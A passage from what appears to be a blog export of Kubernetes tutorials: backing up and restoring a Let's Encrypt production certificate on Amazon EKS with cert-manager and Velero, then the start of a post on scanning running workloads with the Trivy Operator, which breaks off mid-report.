TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Create Let’s Encrypt production certificate These steps should be done only once. Generating production-ready Let’s Encrypt certificates should generally be done only once. The goal is to back up the certificate and then restore it whenever it’s needed for a “new” cluster. Create a Let’s Encrypt production ClusterIssuer: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-production.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-production-dns namespace: cert-manager labels: letsencrypt: production spec: acme: server: https://acme-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-production-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: region: ${AWS_DEFAULT_REGION} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all Create a new certificate and have it signed by Let’s Encrypt to validate it: if ! aws s3 ls \"s3://${CLUSTER_FQDN}/velero/backups/\" | grep -q velero-weekly-backup-cert-manager; then tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-production.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-production namespace: cert-manager labels: letsencrypt: production spec: secretName: ingress-cert-production secretTemplate: labels: letsencrypt: production issuerRef: name: letsencrypt-production-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF kubectl wait --namespace cert-manager --for=condition=Ready --timeout=10m certificate ingress-cert-production fi Create S3 bucket The following step should be done only once. Use CloudFormation to create an S3 bucket that will be used to store backups from Velero. if ! aws s3 ls \"s3://${CLUSTER_FQDN}\"; then cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/aws-s3.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Parameters: S3BucketName: Description: Name of the S3 bucket Type: String EmailToSubscribe: Description: Confirm subscription over email to receive a copy of S3 events Type: String Resources: S3Bucket: Type: AWS::S3::Bucket Properties: BucketName: !Ref S3BucketName PublicAccessBlockConfiguration: BlockPublicAcls: true BlockPublicPolicy: true IgnorePublicAcls: true RestrictPublicBuckets: true LifecycleConfiguration: Rules: - Id: TransitionToOneZoneIA Status: Enabled Transitions: - TransitionInDays: 30 StorageClass: ONEZONE_IA - Id: DeleteOldObjects Status: Enabled ExpirationInDays: 120 BucketEncryption: ServerSideEncryptionConfiguration: - ServerSideEncryptionByDefault: SSEAlgorithm: aws:kms KMSMasterKeyID: alias/aws/s3 NotificationConfiguration: TopicConfigurations: - Event: s3:ObjectCreated:* Topic: !Ref S3ChangeNotificationTopic - Event: s3:ObjectRemoved:* Topic: !Ref S3ChangeNotificationTopic - Event: s3:ReducedRedundancyLostObject Topic: !Ref S3ChangeNotificationTopic - Event: s3:LifecycleTransition Topic: !Ref S3ChangeNotificationTopic - Event: s3:LifecycleExpiration:* Topic: !Ref S3ChangeNotificationTopic S3ChangeNotificationTopic: Type: AWS::SNS::Topic Properties: TopicName: !Join [\"-\", !Split [\".\", !Sub \"${S3BucketName}\"]] DisplayName: S3 Change Notification Topic KmsMasterKeyId: alias/aws/sns S3ChangeNotificationSubscription: Type: AWS::SNS::Subscription Properties: TopicArn: !Ref S3ChangeNotificationTopic Protocol: email Endpoint: !Ref EmailToSubscribe SNSTopicPolicyResponse: Type: AWS::SNS::TopicPolicy Properties: Topics: - !Ref S3ChangeNotificationTopic PolicyDocument: Version: \"2012-10-17\" Statement: - Effect: Allow Principal: \"*\" Action: SNS:Publish Resource: !Ref S3ChangeNotificationTopic Condition: ArnLike: aws:SourceArn: !Sub arn:${AWS::Partition}:s3:::${S3BucketName} SNSTopicPolicy: Type: AWS::SNS::TopicPolicy Properties: Topics: - !Ref S3ChangeNotificationTopic PolicyDocument: Version: \"2012-10-17\" Statement: - Effect: Allow Principal: Service: s3.amazonaws.com Action: sns:Publish Resource: !Ref S3ChangeNotificationTopic Condition: ArnEquals: aws:SourceArn: !GetAtt S3Bucket.Arn S3Policy: Type: AWS::IAM::ManagedPolicy Properties: ManagedPolicyName: !Sub \"${S3BucketName}-s3\" Description: !Sub \"Policy required by Velero to write to S3 bucket ${S3BucketName}\" PolicyDocument: Version: \"2012-10-17\" Statement: - Effect: Allow Action: - s3:ListBucket - s3:GetBucketLocation - s3:ListBucketMultipartUploads Resource: !GetAtt S3Bucket.Arn - Effect: Allow Action: - s3:PutObject - s3:GetObject - s3:DeleteObject - s3:ListMultipartUploadParts - s3:AbortMultipartUpload Resource: !Sub \"arn:aws:s3:::${S3BucketName}/*\" # S3 Bucket policy does not deny HTTP requests - Sid: ForceSSLOnlyAccess Effect: Deny Action: \"s3:*\" Resource: - !Sub \"arn:${AWS::Partition}:s3:::${S3Bucket}\" - !Sub \"arn:${AWS::Partition}:s3:::${S3Bucket}/*\" Condition: Bool: aws:SecureTransport: \"false\" Outputs: S3PolicyArn: Description: The ARN of the created Amazon S3 policy Value: !Ref S3Policy S3Bucket: Description: The name of the created Amazon S3 bucket Value: !Ref S3Bucket S3ChangeNotificationTopicArn: Description: ARN of the SNS Topic for S3 change notifications Value: !Ref S3ChangeNotificationTopic EOF aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides S3BucketName=\"${CLUSTER_FQDN}\" EmailToSubscribe=\"${MY_EMAIL}\" \\ --stack-name \"${CLUSTER_NAME}-s3\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-s3.yml\" fi Install Velero Before installing Velero, it’s necessary to create an IAM Roles for Service Accounts (IRSA) with an S3 policy. The created velero ServiceAccount will be specified in the Velero Helm chart later. S3_POLICY_ARN=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-s3\" --query \"Stacks[0].Outputs[?OutputKey==\\`S3PolicyArn\\`].OutputValue\" --output text) eksctl create iamserviceaccount --cluster=\"${CLUSTER_NAME}\" --name=velero --namespace=velero --attach-policy-arn=\"${S3_POLICY_ARN}\" --role-name=\"eksctl-${CLUSTER_NAME}-irsa-velero\" --approve 2023-03-23 20:13:12 [ℹ] 3 existing iamserviceaccount(s) (cert-manager/cert-manager,external-dns/external-dns,karpenter/karpenter) will be excluded 2023-03-23 20:13:12 [ℹ] 1 iamserviceaccount (velero/velero) was included (based on the include/exclude rules) 2023-03-23 20:13:12 [!] serviceaccounts that exist in Kubernetes will be excluded, use --override-existing-serviceaccounts to override 2023-03-23 20:13:12 [ℹ] 1 task: { 2 sequential sub-tasks: { create IAM role for serviceaccount \"velero/velero\", create serviceaccount \"velero/velero\", } }2023-03-23 20:13:12 [ℹ] building iamserviceaccount stack \"eksctl-k01-addon-iamserviceaccount-velero-velero\" 2023-03-23 20:13:13 [ℹ] deploying stack \"eksctl-k01-addon-iamserviceaccount-velero-velero\" 2023-03-23 20:13:13 [ℹ] waiting for CloudFormation stack \"eksctl-k01-addon-iamserviceaccount-velero-velero\" 2023-03-23 20:13:43 [ℹ] waiting for CloudFormation stack \"eksctl-k01-addon-iamserviceaccount-velero-velero\" 2023-03-23 20:14:34 [ℹ] waiting for CloudFormation stack \"eksctl-k01-addon-iamserviceaccount-velero-velero\" 2023-03-23 20:14:34 [ℹ] created namespace \"velero\" 2023-03-23 20:14:35 [ℹ] created serviceaccount \"velero/velero\" Install the velero Helm chart and modify its default values: # renovate: datasource=helm depName=velero registryUrl=https://vmware-tanzu.github.io/helm-charts VELERO_HELM_CHART_VERSION=\"7.2.1\" helm repo add --force-update vmware-tanzu https://vmware-tanzu.github.io/helm-charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-velero.yml\" &lt;&lt; EOF initContainers: - name: velero-plugin-for-aws # renovate: datasource=docker depName=velero/velero-plugin-for-aws extractVersion=^(?&lt;version&gt;.+)$ image: velero/velero-plugin-for-aws:v1.10.1 volumeMounts: - mountPath: /target name: plugins metrics: serviceMonitor: enabled: true prometheusRule: enabled: true spec: - alert: VeleroBackupPartialFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} partially failed backups. expr: |- velero_backup_partial_failure_total{schedule!=\"\"} / velero_backup_attempt_total{schedule!=\"\"} &gt; 0.25 for: 15m labels: severity: warning - alert: VeleroBackupFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} failed backups. expr: |- velero_backup_failure_total{schedule!=\"\"} / velero_backup_attempt_total{schedule!=\"\"} &gt; 0.25 for: 15m labels: severity: warning configuration: backupStorageLocation: - name: provider: aws bucket: ${CLUSTER_FQDN} prefix: velero config: region: ${AWS_DEFAULT_REGION} volumeSnapshotLocation: - name: provider: aws config: region: ${AWS_DEFAULT_REGION} serviceAccount: server: # Use exiting IRSA service account create: false name: velero credentials: useSecret: false # Create scheduled backup to periodically backup the \"production\" certificate in the \"cert-manager\" namespace every night: schedules: weekly-backup-cert-manager: labels: letsencrypt: production schedule: \"@weekly\" template: includedNamespaces: - cert-manager includedResources: - certificates.cert-manager.io - clusterissuers.cert-manager.io - secrets labelSelector: matchLabels: letsencrypt: production EOF helm upgrade --install --version \"${VELERO_HELM_CHART_VERSION}\" --namespace velero --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-velero.yml\" velero vmware-tanzu/velero Add the Velero Grafana Dashboard: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"56.6.2\" cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack-velero-cert-manager.yml\" &lt;&lt; EOF grafana: dashboards: default: 15469-kubernetes-addons-velero-stats: # renovate: depName=\"Velero Exporter Overview\" gnetId: 15469 revision: 1 datasource: Prometheus EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --reuse-values --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack-velero-cert-manager.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack Backup cert-manager objects These steps should be done only once. Verify that the backup-location is set properly to AWS S3 and is available: velero get backup-location NAME PROVIDER BUCKET/PREFIX PHASE LAST VALIDATED ACCESS MODE DEFAULT default aws k01.k8s.mylabs.dev/velero Available 2023-03-23 20:16:20 +0100 CET ReadWrite true Initiate the backup process and save the necessary cert-manager objects to S3: if ! aws s3 ls \"s3://${CLUSTER_FQDN}/velero/backups/\" | grep -q velero-weekly-backup-cert-manager; then velero backup create --labels letsencrypt=production --ttl 2160h0m0s --from-schedule velero-weekly-backup-cert-manager fi Check the backup details: velero backup describe --selector letsencrypt=production --details Name: velero-weekly-backup-cert-manager-20230323191755 Namespace: velero Labels: letsencrypt=production velero.io/schedule-name=velero-weekly-backup-cert-manager velero.io/storage-location=default Annotations: velero.io/source-cluster-k8s-gitversion=v1.25.6-eks-48e63af velero.io/source-cluster-k8s-major-version=1 velero.io/source-cluster-k8s-minor-version=25+ Phase: Completed Errors: 0 Warnings: 0 Namespaces: Included: cert-manager Excluded: &lt;none&gt; Resources: Included: certificates.cert-manager.io, clusterissuers.cert-manager.io, secrets Excluded: &lt;none&gt; Cluster-scoped: auto Label selector: letsencrypt=production Storage Location: default Velero-Native Snapshot PVs: auto TTL: 720h0m0s CSISnapshotTimeout: 10m0s Hooks: &lt;none&gt; Backup Format Version: 1.1.0 Started: 2023-03-23 20:17:55 +0100 CET Completed: 2023-03-23 20:17:56 +0100 CET Expiration: 2023-04-22 21:17:55 +0200 CEST Total items to be backed up: 2 Items backed up: 2 Resource List: cert-manager.io/v1/Certificate: - cert-manager/ingress-cert-production v1/Secret: - cert-manager/ingress-cert-production Velero-Native Snapshots: &lt;none included&gt; View the files in the S3 bucket: aws s3 ls --recursive \"s3://${CLUSTER_FQDN}/velero/backups\" 2023-03-23 20:17:57 3388 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-backup.json 2023-03-23 20:17:57 29 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-csi-volumesnapshotclasses.json.gz 2023-03-23 20:17:57 29 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-csi-volumesnapshotcontents.json.gz 2023-03-23 20:17:57 29 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-csi-volumesnapshots.json.gz 2023-03-23 20:17:57 2545 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-logs.gz 2023-03-23 20:17:57 29 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-podvolumebackups.json.gz 2023-03-23 20:17:57 99 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-resource-list.json.gz 2023-03-23 20:17:57 49 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-results.gz 2023-03-23 20:17:57 29 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-volumesnapshots.json.gz 2023-03-23 20:17:57 8369 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755.tar.gz Restore cert-manager objects The following steps will show how to restore a Let’s Encrypt production certificate (previously backed up by Velero to S3) to a new cluster. Start the restore procedure for the cert-manager objects: velero restore create --from-schedule velero-weekly-backup-cert-manager --labels letsencrypt=production --wait View details about the restore process: velero restore describe --selector letsencrypt=production --details Name: velero-weekly-backup-cert-manager-20230323202248 Namespace: velero Labels: letsencrypt=production Annotations: &lt;none&gt; Phase: Completed Total items to be restored: 2 Items restored: 2 Started: 2023-03-23 20:22:51 +0100 CET Completed: 2023-03-23 20:22:52 +0100 CET Backup: velero-weekly-backup-cert-manager-20230323191755 Namespaces: Included: all namespaces found in the backup Excluded: &lt;none&gt; Resources: Included: * Excluded: nodes, events, events.events.k8s.io, backups.velero.io, restores.velero.io, resticrepositories.velero.io, csinodes.storage.k8s.io, volumeattachments.storage.k8s.io, backuprepositories.velero.io Cluster-scoped: auto Namespace mappings: &lt;none&gt; Label selector: &lt;none&gt; Restore PVs: auto Existing Resource Policy: &lt;none&gt; Preserve Service NodePorts: auto Verify that the certificate was restored properly: kubectl describe certificates -n cert-manager ingress-cert-production Name: ingress-cert-production Namespace: cert-manager Labels: letsencrypt=production velero.io/backup-name=velero-weekly-backup-cert-manager-20230323194540 velero.io/restore-name=velero-weekly-backup-cert-manager-20230324051646 Annotations: &lt;none&gt; API Version: cert-manager.io/v1 Kind: Certificate ... ... ... Spec: Common Name: *.k01.k8s.mylabs.dev Dns Names: *.k01.k8s.mylabs.dev k01.k8s.mylabs.dev Issuer Ref: Kind: ClusterIssuer Name: letsencrypt-production-dns Secret Name: ingress-cert-production Secret Template: Labels: Letsencrypt: production Status: Conditions: Last Transition Time: 2023-03-24T05:16:48Z Message: Certificate is up to date and has not expired Observed Generation: 1 Reason: Ready Status: True Type: Ready Not After: 2023-06-21T18:10:31Z Not Before: 2023-03-23T18:10:32Z Renewal Time: 2023-05-22T18:10:31Z Events: &lt;none&gt; Reconfigure ingress-nginx The previous steps restored the Let’s Encrypt production certificate cert-manager/ingress-cert-production. Let’s configure ingress-nginx to use this certificate. Check the current “staging” certificate - this will be replaced by the “production” one: while ! curl -sk \"https://${CLUSTER_FQDN}\" &gt; /dev/null; do date sleep 5 done openssl s_client -connect \"${CLUSTER_FQDN}:443\" &lt; /dev/null depth=2 C = US, O = (STAGING) Internet Security Research Group, CN = (STAGING) Pretend Pear X1 verify error:num=20:unable to get local issuer certificate verify return:0 ... --- Server certificate subject=/CN=*.k01.k8s.mylabs.dev issuer=/C=US/O=(STAGING) Let's Encrypt/CN=(STAGING) Artificial Apricot R3 --- ... Configure ingress-nginx to use the production Let’s Encrypt certificate: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.9.1\" cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx-production-certs.yml\" &lt;&lt; EOF controller: extraArgs: default-ssl-certificate: cert-manager/ingress-cert-production EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --reuse-values --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx-production-certs.yml\" ingress-nginx ingress-nginx/ingress-nginx The production certificate should now be active: openssl s_client -connect \"${CLUSTER_FQDN}:443\" &lt; /dev/null depth=2 C = US, O = Internet Security Research Group, CN = ISRG Root X1 verify return:1 depth=1 C = US, O = Let's Encrypt, CN = R3 verify return:1 depth=0 CN = *.k01.k8s.mylabs.dev ... --- Server certificate subject=/CN=*.k01.k8s.mylabs.dev issuer=/C=US/O=Let's Encrypt/CN=R3 --- ... Here is the report from SSL Labs: Rotation of the “production” certificate Let’s Encrypt certificates are valid for 90 days. It is necessary to renew them before they expire. Here are a few commands showing details after cert-manager has renewed the certificate. Examine the certificate details: kubectl describe certificates -n cert-manager ingress-cert-production ... Status: Conditions: Last Transition Time: 2023-09-13T04:50:19Z Message: Certificate is up to date and has not expired Observed Generation: 1 Reason: Ready Status: True Type: Ready Not After: 2023-12-12T03:53:45Z Not Before: 2023-09-13T03:53:46Z Renewal Time: 2023-11-12T03:53:45Z Revision: 1 Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Issuing 58m cert-manager-certificates-trigger Renewing certificate as renewal was scheduled at 2023-09-09 13:39:16 +0000 UTC Normal Reused 58m cert-manager-certificates-key-manager Reusing private key stored in existing Secret resource \"ingress-cert-production\" Normal Requested 58m cert-manager-certificates-request-manager Created new CertificateRequest resource \"ingress-cert-production-1\" Normal Issuing 55m cert-manager-certificates-issuing The certificate has been successfully issued Look at the CertificateRequest details: kubectl describe certificaterequests -n cert-manager ingress-cert-production-1 Name: ingress-cert-production-1 Namespace: cert-manager Labels: letsencrypt=production velero.io/backup-name=velero-weekly-backup-cert-manager-20230711144135 velero.io/restore-name=velero-weekly-backup-cert-manager-20230913045017 Annotations: cert-manager.io/certificate-name: ingress-cert-production cert-manager.io/certificate-revision: 1 cert-manager.io/private-key-secret-name: ingress-cert-production-kxk5s API Version: cert-manager.io/v1 Kind: CertificateRequest Metadata: Creation Timestamp: 2023-09-13T04:50:19Z Generation: 1 Owner References: API Version: cert-manager.io/v1 Block Owner Deletion: true Controller: true Kind: Certificate Name: ingress-cert-production UID: b04e1186-e6c5-42d0-8d61-34810644b386 Resource Version: 8653 UID: b9c209b3-0bac-440d-a62f-91800c6c458b Spec: Extra: authentication.kubernetes.io/pod-name: cert-manager-f9f87498d-nvggh authentication.kubernetes.io/pod-uid: 3b1a2731-0e75-4cf2-bdbd-7278ac364498 Groups: system:serviceaccounts system:serviceaccounts:cert-manager system:authenticated Issuer Ref: Kind: ClusterIssuer Name: letsencrypt-production-dns Request: LS0xxxxxxxS0K UID: 8704d6db-816e-4c93-bcc8-8801060b05d0 Username: system:serviceaccount:cert-manager:cert-manager Status: Certificate: LSxxxxxxCg== Conditions: Last Transition Time: 2023-09-13T04:50:19Z Message: Certificate request has been approved by cert-manager.io Reason: cert-manager.io Status: True Type: Approved Last Transition Time: 2023-09-13T04:53:46Z Message: Certificate fetched from issuer successfully Reason: Issued Status: True Type: Ready Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal WaitingForApproval 54m cert-manager-certificaterequests-issuer-ca Not signing CertificateRequest until it is Approved Normal WaitingForApproval 54m cert-manager-certificaterequests-issuer-acme Not signing CertificateRequest until it is Approved Normal WaitingForApproval 54m cert-manager-certificaterequests-issuer-vault Not signing CertificateRequest until it is Approved Normal WaitingForApproval 54m cert-manager-certificaterequests-issuer-selfsigned Not signing CertificateRequest until it is Approved Normal WaitingForApproval 54m cert-manager-certificaterequests-issuer-venafi Not signing CertificateRequest until it is Approved Normal cert-manager.io 54m cert-manager-certificaterequests-approver Certificate request has been approved by cert-manager.io Normal OrderCreated 54m cert-manager-certificaterequests-issuer-acme Created Order resource cert-manager/ingress-cert-production-1-3932937138 Normal OrderPending 54m cert-manager-certificaterequests-issuer-acme Waiting on certificate issuance from order cert-manager/ingress-cert-production-1-3932937138: \"\" Normal CertificateIssued 50m cert-manager-certificaterequests-issuer-acme Certificate fetched from issuer successfully Check the cert-manager logs for renewal activity: kubectl logs -n cert-manager cert-manager-f9f87498d-nvggh ... I0913 04:50:18.960223 1 conditions.go:203] Setting lastTransitionTime for Certificate \"ingress-cert-production\" condition \"Ready\" to 2023-09-13 04:50:18.960211036 +0000 UTC m=+451.003679107 I0913 04:50:18.962295 1 trigger_controller.go:194] \"cert-manager/certificates-trigger: Certificate must be re-issued\" key=\"cert-manager/ingress-cert-production\" reason=\"Renewing\" message=\"Renewing certificate as renewal was scheduled at &lt;nil&gt;\" I0913 04:50:18.962464 1 conditions.go:203] Setting lastTransitionTime for Certificate \"ingress-cert-production\" condition \"Issuing\" to 2023-09-13 04:50:18.962457264 +0000 UTC m=+451.005925351 I0913 04:50:19.011897 1 conditions.go:203] Setting lastTransitionTime for Certificate \"ingress-cert-production\" condition \"Ready\" to 2023-09-13 04:50:19.011889134 +0000 UTC m=+451.055357214 I0913 04:50:19.020026 1 trigger_controller.go:194] \"cert-manager/certificates-trigger: Certificate must be re-issued\" key=\"cert-manager/ingress-cert-production\" reason=\"Renewing\" message=\"Renewing certificate as renewal was scheduled at &lt;nil&gt;\" I0913 04:50:19.020061 1 conditions.go:203] Setting lastTransitionTime for Certificate \"ingress-cert-production\" condition \"Issuing\" to 2023-09-13 04:50:19.020054522 +0000 UTC m=+451.063522609 I0913 04:50:19.046907 1 trigger_controller.go:194] \"cert-manager/certificates-trigger: Certificate must be re-issued\" key=\"cert-manager/ingress-cert-production\" reason=\"Renewing\" message=\"Renewing certificate as renewal was scheduled at 2023-09-09 13:39:16 +0000 UTC\" I0913 04:50:19.046942 1 conditions.go:203] Setting lastTransitionTime for Certificate \"ingress-cert-production\" condition \"Issuing\" to 2023-09-13 04:50:19.046937063 +0000 UTC m=+451.090405134 I0913 04:50:19.134032 1 conditions.go:263] Setting lastTransitionTime for CertificateRequest \"ingress-cert-production-1\" condition \"Approved\" to 2023-09-13 04:50:19.134023095 +0000 UTC m=+451.177491158 I0913 04:50:19.175761 1 conditions.go:263] Setting lastTransitionTime for CertificateRequest \"ingress-cert-production-1\" condition \"Ready\" to 2023-09-13 04:50:19.175750564 +0000 UTC m=+451.219218635 I0913 04:50:19.210564 1 conditions.go:263] Setting lastTransitionTime for CertificateRequest \"ingress-cert-production-1\" condition \"Ready\" to 2023-09-13 04:50:19.210549558 +0000 UTC m=+451.254017629 I0913 04:53:46.526286 1 acme.go:233] \"cert-manager/certificaterequests-issuer-acme/sign: certificate issued\" resource_name=\"ingress-cert-production-1\" resource_namespace=\"cert-manager\" resource_kind=\"CertificateRequest\" resource_version=\"v1\" related_resource_name=\"ingress-cert-production-1-3932937138\" related_resource_namespace=\"cert-manager\" related_resource_kind=\"Order\" related_resource_version=\"v1\" I0913 04:53:46.526563 1 conditions.go:252] Found status change for CertificateRequest \"ingress-cert-production-1\" condition \"Ready\": \"False\" -&gt; \"True\"; setting lastTransitionTime to 2023-09-13 04:53:46.526554494 +0000 UTC m=+658.570022573 Back up the certificate before deleting the cluster (in case it was renewed): if [[ \"$(kubectl get --raw /api/v1/namespaces/cert-manager/services/cert-manager:9402/proxy/metrics | awk '/certmanager_http_acme_client_request_count.*acme-v02\\.api.*finalize/ { print $2 }')\" -gt 0 ]]; then velero backup create --labels letsencrypt=production --ttl 2160h0m0s --from-schedule velero-weekly-backup-cert-manager fi Clean-up Remove files from the ${TMP_DIR}/${CLUSTER_FQDN} directory: for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{aws-s3,helm_values-{ingress-nginx-production-certs,kube-prometheus-stack-velero-cert-manager,velero},k8s-cert-manager-clusterissuer-production}.yml; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy … 😉" }, { "title": "Trivy Operator Dashboard in Grafana", "url": "/posts/trivy-operator-grafana/", "categories": "Kubernetes, Cloud, Security", "tags": "amazon-eks, kubernetes, grafana, security", "date": "2023-03-08 00:00:00 +0100", "content": "In a previous post, “Cheapest Amazon EKS”, I installed the kube-prometheus-stack to enable cluster monitoring, which includes Grafana, Prometheus, and a few other components. Many tools allow you to scan container images and display their vulnerabilities, such as Trivy, Grype, or Clair. Unfortunately, there are not as many open-source (OSS) tools that can show vulnerabilities of container images running inside Kubernetes (K8s). This capability is usually a paid offering from third-party vendors like Palo Alto Networks, Aqua Security, Wiz, and many others. Let’s look at the Trivy Operator, which can help you build your Kubernetes cluster’s security posture (covering Compliance, Vulnerabilities, RBAC, and more). I’ll walk you through the installation process, its integration with Prometheus and Grafana, and some examples to help you better understand how it works. Links: Trivy Operator Dashboard in Grafana Kubernetes Benchmark Scans with Trivy: CIS and NSA Reports Requirements An Amazon EKS cluster with the kube-prometheus-stack installed (as described in “Cheapest Amazon EKS)” Helm The following variables are used in the subsequent steps: export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Install Trivy Operator Install the trivy-operator Helm chart and modify its default values: # renovate: datasource=helm depName=trivy-operator registryUrl=https://aquasecurity.github.io/helm-charts/ TRIVY_OPERATOR_HELM_CHART_VERSION=\"0.20.6\" helm repo add --force-update aqua https://aquasecurity.github.io/helm-charts/ cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-trivy-operator.yml\" &lt;&lt; EOF serviceMonitor: enabled: true trivy: ignoreUnfixed: true EOF helm upgrade --install --version \"${TRIVY_OPERATOR_HELM_CHART_VERSION}\" --namespace trivy-system --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-trivy-operator.yml\" trivy-operator aqua/trivy-operator Once the Helm chart is installed, you can see the trivy-operator initiating scans: kubectl get pods -n trivy-system NAME READY STATUS RESTARTS AGE node-collector-7555455fcf-q4dp6 0/1 Completed 0 11s node-collector-7f544b4779-7p5zr 0/1 Completed 0 11s scan-vulnerabilityreport-55bc49bd77-nr5br 0/2 Init:0/1 0 9s scan-vulnerabilityreport-594f6f446-v64sp 0/1 Init:0/1 0 2s scan-vulnerabilityreport-65cd458f97-6zbs8 0/3 Init:0/1 0 4s scan-vulnerabilityreport-6d9888f48-vrtxg 0/4 Init:0/1 0 2s scan-vulnerabilityreport-74b9cf67dd-mpqgj 0/1 Init:0/1 0 11s scan-vulnerabilityreport-77875c6784-vwkv2 0/1 Init:0/1 0 1s scan-vulnerabilityreport-7bd5758c7b-5wjqq 0/1 Init:0/1 0 8s scan-vulnerabilityreport-7dc9c49c47-gfrlk 0/3 Init:0/1 0 6s scan-vulnerabilityreport-978494f65-ggd8g 0/3 Init:0/1 0 7s scan-vulnerabilityreport-c7b7fbfdd-284zv 0/1 Init:0/1 0 5s trivy-operator-56bdc96f8-dls8c 1/1 Running 0 15s Trivy Operator details Let’s look at some examples to see how the Trivy Operator can help identify security issues in a Kubernetes cluster. The outputs below were generated on 2023-03-12 and will differ in the future. Vulnerability Reports Deploy a vulnerable (old) version of nginx:1.22.0 to the cluster: kubectl create namespace test-trivy1 kubectl run nginx --namespace=test-trivy1 --image=nginx:1.22.0 echo -n \"Waiting for trivy-operator to create VulnerabilityReports: \" until kubectl get vulnerabilityreports -n test-trivy1 -o go-template='{{.items | len}}' | grep -qxF 1; do echo -n \".\" sleep 3 done View a summary of the container image vulnerabilities present in the old version of nginx: kubectl get vulnerabilityreports -n test-trivy1 -o wide NAME REPOSITORY TAG SCANNER AGE CRITICAL HIGH MEDIUM LOW UNKNOWN pod-nginx-nginx library/nginx 1.22.0 Trivy 4m33s 3 18 39 0 0 Examine the VulnerabilityReports, which represent the latest vulnerabilities found in a container image of a given Kubernetes workload. Each report consists of a list of OS package and application vulnerabilities, with a summary of vulnerabilities grouped by severity. kubectl describe vulnerabilityreports -n test-trivy1 Name: pod-nginx-nginx Namespace: test-trivy1 Labels: resource-spec-hash=5b79d7b777 trivy-operator.container.name=nginx trivy-operator.resource.kind=Pod trivy-operator.resource.name=nginx trivy-operator.resource.namespace=test-trivy1 Annotations: trivy-operator.aquasecurity.github.io/report-ttl: 24h0m0s API Version: aquasecurity.github.io/v1alpha1 Kind: VulnerabilityReport Metadata: Creation Timestamp: 2023-03-14T04:28:11Z Generation: 1 Managed Fields: API Version: aquasecurity.github.io/v1alpha1 ... Manager: trivy-operator Operation: Update Time: 2023-03-14T04:28:11Z Owner References: API Version: v1 Block Owner Deletion: false Controller: true Kind: Pod Name: nginx UID: c879915a-7f0a-4ac1-a507-c9c47e69aa42 Resource Version: 114086 UID: 7531bd9b-2fe2-40cd-9223-280af46bebec Report: Artifact: 